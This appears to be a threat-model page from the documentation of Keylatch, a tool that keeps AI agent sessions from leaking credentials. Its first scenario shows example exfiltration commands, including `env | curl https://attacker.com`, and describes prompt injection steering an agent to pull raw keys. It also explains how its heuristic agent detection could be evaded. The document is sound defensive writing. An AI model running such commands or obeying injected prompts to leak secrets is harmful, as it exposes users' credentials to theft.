---
title: Threat Model
description: Attack scenarios Keylatch defends against — and what it does not defend against.
---

# Threat Model

Keylatch is designed to prevent AI agent sessions from exfiltrating credentials
or performing unauthorized API calls. This document describes the three primary
attack scenarios, how Keylatch defends against each, and the explicit gaps that
remain.

---

## Scenario 1 — Exfiltration via tool call

**What the attacker does:**
An LLM agent (or a prompt injected into the agent's context) calls a tool or
issues a shell command such as `keylatch get openrouter api_key`, `env | curl
https://attacker.com`, or reads `~/.keylatch/` directly, with the intent of
exfiltrating a raw credential value.

**How Keylatch defends:**
- `keylatch get` is blocked in LLM sessions (exit 2, `SecurityBlock`) when any
  of the known agent environment variables are set (`CLAUDE_CODE`, `CODEX_ENV`,
  `CREDENTIALS_LLM_SESSION`, `CURSOR_SESSION`, `AIDER_SESSION`, `GEMINI_SESSION`,
  `OPENCODE_SESSION`).
- The `keylatch run` command wraps the subprocess with injected credentials but
  never prints them to stdout/stderr. In all four runtime modes, raw credential
  values are not returned to the calling process.
- The agent-guard hook (`contrib/agent-guards/`) blocks any `keylatch get`
  invocation at the shell level before the process even starts.
- `GET /v1/connections` returns metadata only — no credential values.

**Gap:**
LLM session detection is heuristic (env var based). An adversary who controls
the process environment could unset these variables before spawning Keylatch.
This is mitigated by the gateway isolation model, which never returns credential
values to the agent process at all.

---

## Scenario 2 — Shell history leak

**What the attacker does:**
A credential value is supplied as a CLI argument (e.g. `--api-key sk-...`),
command substitution (`$(keylatch get ...)`), or environment variable export in
a shell profile, and persists in `~/.bash_history`, `ps aux` output, or shell
session logs.

**How Keylatch defends:**
- Keylatch never accepts credential values as positional CLI arguments. The
  `connect` command prompts interactively (stdin) or reads from `--provider-ref`
  URI rather than accepting plaintext values on the command line.
- Credentials stored in the backend are encrypted at rest and never appear as
  plaintext on disk outside the backend's own security boundary.
- The audit log records that a credential was accessed but never records its
  value (value-free receipts).

**Gap:**
A user who passes a credential via shell history (e.g. `export API_KEY=sk-...`)
before calling `keylatch connect` may expose the value in `~/.bash_history`.
Use `keylatch connect <provider>` (interactive prompt) or `--provider-ref` to
avoid this.

---

## Scenario 3 — Malicious provider template injection

**What the attacker does:**
A community-sourced provider template (YAML file in `~/.keylatch/providers/` or
loaded via `keylatch registry scaffold`) contains a malicious `injection_rules`
entry, an overridden `allowed_command_prefixes`, or a crafted `storage_path_tpl`
that causes Keylatch to load credentials from an unexpected location, execute an
attacker-controlled binary, or exfiltrate values to a third-party service.

**How Keylatch defends:**
- Provider templates are validated against a strict JSON Schema on load. Unknown
  fields are rejected. Paths in `storage_path_tpl` are constrained to the
  `~/.keylatch/` namespace.
- The `allowed_command_prefixes` allowlist is enforced for every `keylatch run`
  invocation — the subprocess binary must match a declared prefix.
- Community templates require explicit opt-in (`keylatch registry add --url ...`)
  and are stored separately from embedded templates.
- CI runs `keylatch registry validate` against all embedded templates on every
  pull request.

**Gap:**
User-installed community templates are not cryptographically signed in 0.1.0.
A user who installs a template from an untrusted source accepts the risk that
the template's `injection_rules` and `allowed_command_prefixes` are well-formed
but semantically malicious. Signed templates are planned for 0.2.0.

---

## What Keylatch does NOT defend against

Being explicit about the boundaries:

| Threat | Why Keylatch cannot defend against it |
|--------|--------------------------------------|
| **Compromised local OS (root access)** | Root can read any file, inspect process memory, or modify keylatch binaries. Keylatch assumes the local OS and user account are trusted. |
| **Malicious daemon replacement** | If an attacker replaces the `keylatchd` binary or `keylatch` CLI before you run `keylatch verify --self`, signature verification cannot help. Always verify after fresh installs. |
| **Supply-chain attack on the binary before cosign verification** | Sigstore/cosign provides post-download assurance, not pre-download integrity. A compromised package manager or mirror could deliver a tampered binary. Install from the official GitHub Release and verify immediately. |
| **Memory scraping** | An attacker with read access to the process address space (e.g. via `ptrace`) can extract in-memory credential values. Keylatch zeroes credential byte slices after use but cannot prevent all forms of memory inspection. |
| **Keychain / system secret store vulnerabilities** | Keylatch relies on the operating system's credential storage (macOS Keychain, etc.) for encrypted-at-rest guarantees. Vulnerabilities in those stores are not mitigated by Keylatch. |
| **Network-layer exfiltration** | Keylatch does not block outbound network connections made by the subprocess. If the allowed command exfiltrates data over the network, Keylatch will not detect it. |
| **A malicious agent that tricks the user into approving every grant** | Keylatch can require explicit approvals (approval JWTs, gateway tokens), but cannot prevent a user from approving malicious requests. User judgement is the last line of defence for approvals. |

---

## Security model summary

Keylatch enforces five runtime invariants (see `keylatch security`):

- Your secrets never touch agent memory
- Every secret use is logged
- Revoking access is instant
- Approvals expire automatically
- No secret leaves your machine without your say-so

For the detailed invariant cross-reference table, see [`docs/security/invariants.md`](invariants.md).

For release verification, see [`docs/verifying-releases.md`](../verifying-releases.md).
